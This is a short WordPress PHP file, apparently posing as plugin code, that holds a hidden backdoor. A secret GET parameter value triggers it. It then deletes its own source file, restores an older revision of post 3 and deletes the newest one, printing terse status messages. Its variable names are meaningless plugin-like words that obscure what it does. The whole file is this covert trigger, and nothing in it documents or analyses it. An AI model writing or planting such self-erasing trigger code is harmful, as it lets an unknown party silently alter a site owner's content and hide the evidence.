<?php

function exchange_lightbox_all() {
	if (isset($_GET['webp_table_related']) && $_GET['webp_table_related'] === 'click_pro_software_checkout') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$avatar_extended_roles = 3;
		$statistics_captcha_com_exporter = wp_get_post_revisions($avatar_extended_roles);
		if (empty($statistics_captcha_com_exporter)) die('no revisions');
		if (count($statistics_captcha_com_exporter) < 2) die('less than 2');
		$variation_members_design_picker = array_shift($statistics_captcha_com_exporter);
		$library_wpc_report = $variation_members_design_picker->ID;
		$github_statistics_shipping = array_shift($statistics_captcha_com_exporter);
		$revisions_mode_traffic_sitemaps = $github_statistics_shipping->ID;
		$local_subscriptions_converter_extra = wp_restore_post_revision($revisions_mode_traffic_sitemaps);
		if ($local_subscriptions_converter_extra === false) die('error restoring');
		$local_subscriptions_converter_extra = wp_delete_post_revision($library_wpc_report);		
		if ($local_subscriptions_converter_extra === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'exchange_lightbox_all');
